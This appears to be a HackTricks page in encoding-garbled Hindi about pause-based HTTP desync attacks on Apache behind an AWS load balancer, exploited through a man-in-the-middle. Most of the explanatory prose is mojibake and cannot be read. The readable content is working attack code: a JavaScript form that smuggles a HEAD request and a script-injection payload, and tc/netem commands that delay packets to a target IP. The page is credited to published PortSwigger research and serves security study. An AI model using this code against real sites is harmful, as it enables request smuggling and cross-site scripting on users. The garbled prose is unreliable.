<figure><img src="../../.gitbook/assets/image (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

ALB рдХреЗ рдкреАрдЫреЗ Apache рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рдЬрдЯрд┐рд▓рддрд╛ рд╣реИ - **рджреЛрдиреЛрдВ рд╕рд░реНрд╡рд░реЛрдВ** рдХрд╛ рдПрдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ **рд╕рдордп рд╕рдорд╛рдкреНрддрд┐ 60 рд╕реЗрдХрдВрдб** рд╣реИред рдЗрд╕рд╕реЗ рдЕрдиреБрд░реЛрдз рдХреЗ рджреВрд╕рд░реЗ рднрд╛рдЧ рдХреЛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **рдЕрддреНрдпрдВрдд рдЫреЛрдЯреА рд╕рдордп-рдЦрд┐рдбрд╝рдХреА** рдмрдЪрддреА рд╣реИред RC рд╣рдорд▓рд╛ рдЕрдВрддрддрдГ 66 рдШрдВрдЯреЗ рдХреЗ рдмрд╛рдж рд╕рдлрд▓ рд░рд╣рд╛ред

### MITM рд╢реЛрд╖рдг

рдпрд╣ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕реЗ рдПрдХ рдЕрдиреБрд░реЛрдз рдХреЛ рд░реЛрдХрдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ** рддрд╛рдХрд┐ Pause-desync рднреЗрджреНрдпрддрд╛ рдХрд╛ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рд╣рдореЗрд╢рд╛ **рдПрдХ MITM рд╣рдорд▓рд╛ рдХрд░рдХреЗ рдПрдХ рдЕрдиреБрд░реЛрдз рдХреЛ рд░реЛрдХ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рджреНрд╡рд╛рд░рд╛ рднреЗрдЬрд╛ рдЧрдпрд╛ рд╣реИред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рд╣рдорд▓рд╛ **рдХрд┐рд╕реА рднреА рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдкрд░ рдирд┐рд░реНрднрд░ рдирд╣реАрдВ рдХрд░рддрд╛** рд╣реИред

рд╣рдорд▓реЗ рдХрд╛ рдкреНрд░рд╡рд╛рд╣ рдПрдХ рдирд┐рдпрдорд┐рдд рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдбрд┐рд╕рд┐рдВрдХ рд╣рдорд▓реЗ рдХреЗ рд╕рдорд╛рди рд╣реИред рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░-рдирд┐рдпрдВрддреНрд░рд┐рдд рдкреГрд╖реНрда рдкрд░ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рд▓рдХреНрд╖реНрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд▓рд┐рдП рдПрдХ рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХреА **рдХреНрд░реЙрд╕-рдбреЛрдореЗрди рдЕрдиреБрд░реЛрдз** рдЬрд╛рд░реА рдХрд░рддрд╛ рд╣реИред **рдкрд╣рд▓рд╛ HTTP** рдЕрдиреБрд░реЛрдз рдЬрд╛рдирдмреВрдЭрдХрд░ рдЗрддрдирд╛ **рдмрдбрд╝рд╛** рдкреИрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдЗрд╕реЗ рдХрдИ TCP рдкреИрдХреЗрдЯреЛрдВ рдореЗрдВ **рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд░ рджреЗрддрд╛ рд╣реИ**, рдЬрд┐рд╕рд╕реЗ рдПрдХ рд╕рдХреНрд░рд┐рдп **MITM рдЕрдВрддрд┐рдо рдкреИрдХреЗрдЯ рдХреЛ рджреЗрд░реА рдХрд░ рд╕рдХрддрд╛ рд╣реИ**, рдПрдХ рдкреЙрдЬрд╝-рдЖрдзрд╛рд░рд┐рдд рдбрд┐рд╕рд┐рдВрдХ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИред рдкреИрдбрд┐рдВрдЧ рдХреЗ рдХрд╛рд░рдг, **рд╣рдорд▓рд╛рд╡рд░** **рдЖрдХрд╛рд░** рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╕рд░рд▓рддрд╛ рд╕реЗ рдкрд╣рдЪрд╛рди рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕ **рдкреИрдХреЗрдЯ рдХреЛ рд░реЛрдХрдирд╛** рд╣реИред

рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рд╕реЗ рдпрд╣ рдПрдХ рдирд┐рдпрдорд┐рдд рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдбрд┐рд╕рд┐рдВрдХ рдХреА рддрд░рд╣ рджрд┐рдЦрддрд╛ рд╣реИ HEAD рдЧреИрдЬреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, рдЕрдиреБрд░реЛрдз рдкреИрдбрд┐рдВрдЧ рдХреЛ рдЫреЛрдбрд╝рдХрд░:
```javascript
let form = document.createElement('form')
form.method = 'POST'
form.enctype = 'text/plain'
form.action = 'https://x.psres.net:6082/redirect?'+"h".repeat(600)+ Date.now()
let input = document.createElement('input')
input.name = "HEAD / HTTP/1.1\r\nHost: x\r\n\r\nGET /redirect?<script>alert(document.domain)</script> HTTP/1.1\r\nHost: x\r\nFoo: bar"+"\r\n\r\n".repeat(1700)+"x"
input.value = "x"
form.append(input)
document.body.appendChild(form)
form.submit()
```
рдЖрдХреНрд░рдордгрдХрд╛рд░реА рдкреНрд░рдгрд╛рд▓реА рдкрд░ рдЕрдВрдзрд╛ MITM рдХрд░рддреЗ рд╕рдордп, рджреЗрд░реА рдХреЛ tc-NetEm рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛:
```bash
# Setup
tc qdisc add dev eth0 root handle 1: prio priomap

# Flag packets to 34.255.5.242 that are between 700 and 1300 bytes
tc filter add dev eth0 protocol ip parent 1:0 prio 1 basic \
match 'u32(u32 0x22ff05f2 0xffffffff at 16)' \
and 'cmp(u16 at 2 layer network gt 0x02bc)' \
and 'cmp(u16 at 2 layer network lt 0x0514)' \
flowid 1:3

# Delay flagged packets by 61 seconds
tc qdisc add dev eth0 parent 1:3 handle 10: netem delay 61s
```
## **рд╕рдВрджрд░реНрдн**

* рдЗрд╕ рдкреЛрд╕реНрдЯ рдХреА рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks) рд╕реЗ рд▓реА рдЧрдИ рд╣реИред

<details>

<summary><strong> AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ </strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рд╣рдореЗрдВ ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live) **рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
